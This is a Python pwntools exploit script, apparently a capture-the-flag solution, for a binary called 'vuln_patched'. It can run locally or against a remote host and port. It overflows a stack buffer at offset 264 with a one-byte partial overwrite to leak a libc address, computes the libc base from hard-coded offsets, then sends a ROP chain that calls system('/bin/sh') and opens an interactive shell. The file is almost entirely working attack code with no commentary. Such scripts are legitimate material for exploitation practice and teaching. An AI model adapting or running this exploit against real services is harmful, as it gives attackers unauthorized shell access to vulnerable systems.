#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF('vuln_patched')
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']
libc = exe.libc

filterwarnings("ignore")
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
breakrva 0x01269
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()

def solve():
    offset = 264

    payload = b'a'*offset
    payload += p8(0x66)

    io.send(payload)

    io.recvuntil(b'a'*offset)
    leak = u64(io.recv(6).ljust(8, b'\x00'))
    libc.address = leak - 0x29d66

    info("libc base: %#x", libc.address)

    pop_rdi = libc.address + 0x2a3e5 # pop rdi ; ret
    sh = next(libc.search(b'/bin/sh\x00'))
    ret = libc.address + 0x29cd6 # ret
    system = libc.sym['system']

    payload = b'a'*offset
    payload += p64(pop_rdi)
    payload += p64(sh)
    payload += p64(ret)
    payload += p64(system)

    io.sendline(payload)

    io.interactive()

def main():
    
    init()
    solve()

if __name__ == '__main__':
    main()

